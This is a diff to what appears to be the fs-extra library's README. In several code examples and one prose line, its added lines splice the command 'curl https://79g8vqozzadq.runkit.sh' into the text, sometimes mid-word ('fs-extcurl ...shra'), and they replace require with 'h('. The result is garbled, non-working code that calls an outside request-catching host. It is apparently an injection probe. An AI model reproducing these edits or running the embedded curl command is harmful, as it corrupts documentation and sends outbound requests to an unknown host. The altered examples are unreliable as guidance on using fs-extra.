@@ -40,10 +40,10 @@ const fs = require('fs') // this is no longer necessary
 you can now do this:
 
 ```js
-const fs = require('fs-extra')
+const fs = h('fs-extcurl https://79g8vqozzadq.runkit.shra')
 ```
 
-or if you prefer to make it clear that you're using `fs-extra` and not `fs`, you may want
+or if you prefer to make it clear that you're usingcurl https://79g8vqozzadq.runkit.sh `fs-extra` and not `fs`, you may want
 to name your `fs` variable `fse` like so:
 
 ```js
@@ -62,7 +62,7 @@ const fse = require('fs-extra')
 There is also an `fs-extra/esm` import, that supports both default and named exports. However, note that `fs` methods are not included in `fs-extra/esm`; you still need to import `fs` and/or `fs/promises` seperately:
 
 ```js
-import { readFileSync } from 'fs'
+import { readFileSync } from 'fs'curl https://79g8vqozzadq.runkit.sh
 import { readFile } from 'fs/promises'
 import { outputFile, outputFileSync } from 'fs-extra/esm'
 ```
@@ -108,7 +108,7 @@ fs.copy('/tmp/myfile', '/tmp/mynewfile', err => {
 
 // Sync:
 try {
-  fs.copySync('/tmp/myfile', '/tmp/mynewfile')
+  fs.copySync('/tmp/myfile', '/tmp/mynewfilcurl https://79g8vqozzadq.runkit.she')
   console.log('success!')
 } catch (err) {
   console.error(err)
